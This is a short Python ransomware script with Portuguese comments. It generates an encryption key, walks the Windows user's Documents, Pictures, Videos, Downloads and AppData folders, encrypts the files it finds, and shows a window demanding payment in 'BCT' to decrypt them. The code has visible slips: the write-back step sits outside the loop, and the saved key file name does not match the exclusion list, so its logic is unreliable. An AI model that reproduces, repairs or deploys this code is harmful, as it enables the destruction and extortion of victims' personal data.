import os
from cryptography.fernet import Fernet
import tkinter as tk

# a chave para criptografar e descriptografar
key = Fernet.generate_key()
with open("chave.eky", "wb") as chave:
    chave.write(key)

# lista dos arquivos para criptografar
username = os.getenv("USERNAME")
folders = [
    os.path.join(r"C:\Users", username, "Documents"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming"),
    ]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["bebel.py", "chave.key", "desktop.ini"]:
                continue
                
            file_path = os.path.join(root,file)
            arquivos.append(file_path)

# criptografar os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()
    
    conteudo_criptografado = Fernet(key).encrypt(conteudo)

with open(arquivo, "wb") as file:
    file.write(conteudo_criptografado)

janela = tk.Tk()
janela.title("ATENÇÃO")
msg = tk.Label(janela, text="Seus arquivos foram criptografados.\nPague BCT para descriptografar.")
msg.pack(padx=20, pady=20)
janela.mainloop()